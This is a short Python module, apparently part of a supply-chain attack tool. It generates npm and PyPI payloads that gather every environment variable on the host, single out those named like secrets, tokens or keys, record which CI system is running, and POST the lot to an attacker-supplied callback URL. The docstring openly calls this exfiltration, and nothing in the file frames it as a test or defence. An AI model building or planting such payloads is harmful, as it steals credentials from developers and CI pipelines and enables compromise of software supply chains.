"""Generate runtime payloads for multiple ecosystems."""
from __future__ import annotations

import json
import os
from typing import Dict

CI_ENV_VARS = [
    "GITHUB_ACTIONS",
    "GITLAB_CI",
    "CIRCLECI",
    "JENKINS_URL",
]


def detect_ci() -> str:
    for var in CI_ENV_VARS:
        if var in os.environ:
            return var
    return "unknown"


def _collect_secrets(env: Dict[str, str]) -> Dict[str, str]:
    return {k: v for k, v in env.items() if any(x in k.lower() for x in ["secret", "token", "key"])}


def build_payload(registry: str, callback_url: str) -> str:
    """Return a small payload that exfiltrates environment variables and secrets."""
    ci = detect_ci()
    if registry.lower() in {"npm", "node"}:
        return (
            "const http=require('http');"\
            "const env=process.env;"\
            "const data={env:env,ci:'" + ci + "',secrets:Object.fromEntries(Object.entries(env).filter(([k])=>k.toLowerCase().includes('secret')||k.toLowerCase().includes('token')||k.toLowerCase().includes('key')))};"\
            "const req=http.request('" + callback_url + "',{method:'POST',headers:{'Content-Type':'application/json'}});"\
            "req.end(JSON.stringify(data));"
        )
    if registry.lower() in {"pypi", "python"}:
        return (
            "import os,json,urllib.request;"\
            "env=dict(os.environ);"\
            "secrets={k:v for k,v in env.items() if any(x in k.lower() for x in ['secret','token','key'])};"\
            "data={'env':env,'ci':'" + ci + "','secrets':secrets};"\
            "req=urllib.request.Request('" + callback_url + "',data=json.dumps(data).encode(),headers={'Content-Type':'application/json'});"\
            "urllib.request.urlopen(req)"
        )
    return "echo callback"  # default fallback
